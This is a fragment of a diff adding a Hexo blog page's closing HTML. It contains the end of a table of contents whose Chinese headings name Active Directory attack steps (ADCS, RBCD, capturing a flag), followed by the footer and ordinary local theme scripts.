toc-article-level-4"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95-ADCS-%E8%8E%B7%E5%8F%96Hash%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">尝试 ADCS 获取Hash（失败）</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ADCS-RBCD"><span class="toc-article-text">ADCS+RBCD</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96flag04"><span class="toc-article-text">获取flag04</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
